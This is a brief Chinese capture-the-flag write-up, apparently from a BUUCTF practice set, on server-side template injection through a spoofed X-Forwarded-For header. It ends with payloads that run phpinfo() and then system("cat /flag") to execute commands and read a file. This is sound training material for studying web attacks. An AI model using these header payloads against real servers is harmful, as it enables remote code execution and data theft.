# 知识点：

# 1. 模板注入（ssti)

# 2. xff头模板注入



# 1. 进入首页，发现存在flag，页面和hin.php页面

访问hint.php页面，网页源码注释提示：

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/3A641C75450D46159FA626751380602Cclipboard.png)



而flag.php页面会显示，自己ip



# 2. 尝试xff头伪造ip

![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/4F2DDF1BEB104A6896CA783D80672A64clipboard.png)

发现可以伪造。

## 此时可以考虑：

## 1.sql注入

## 2.模板注入

## 3.xss注入



结合该题没有什么需要管理员登陆的地方，应该不是xss注入。而回显ip也感觉没和数据库交互。所以尝试模板注入



# 3. payload:

```javascript
X-Forwarded-For: {phpinfo()}
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/CA3245ACDFB34B3284EFD73897CD5D17clipboard.png)

发现注入成功。



# 4. 读取flag

```javascript
X-Forwarded-For: {system("cat /flag")}
```

